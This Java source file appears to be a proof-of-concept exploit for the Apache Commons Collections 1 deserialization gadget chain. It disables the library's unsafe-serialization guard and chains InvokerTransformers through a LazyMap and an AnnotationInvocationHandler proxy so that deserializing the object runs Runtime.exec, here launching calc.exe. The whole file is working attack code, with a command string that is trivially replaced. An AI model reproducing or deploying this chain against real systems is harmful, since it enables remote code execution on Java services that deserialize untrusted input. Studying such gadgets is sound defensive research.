package serlize;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonCollections1_Lazymap {
    public static void main(String[] args) throws Exception
    {
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
        Transformer[] transformers = new Transformer[]
        {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"calc.exe"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
//        innerMap.put("value","xxx");
//        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
//        outerMap.put("test", "xxxx");
        Map outerMap=LazyMap.decorate(innerMap,transformerChain);
        Class<?> classz= Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor con=classz.getDeclaredConstructor(Class.class, Map.class);
        con.setAccessible(true);
        InvocationHandler invo=(InvocationHandler) con.newInstance(Retention.class,outerMap);
        Map pxy=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invo);
        invo=(InvocationHandler)con.newInstance(Retention.class,pxy);

        ByteArrayOutputStream byout=new ByteArrayOutputStream();
        ObjectOutputStream obout=new ObjectOutputStream(byout);

        obout.writeObject(invo);
        obout.close();

        System.out.println(byout);
        ObjectInputStream o=new ObjectInputStream(new ByteArrayInputStream(byout.toByteArray()));
        Object oo=(Object) o.readObject();
    }
}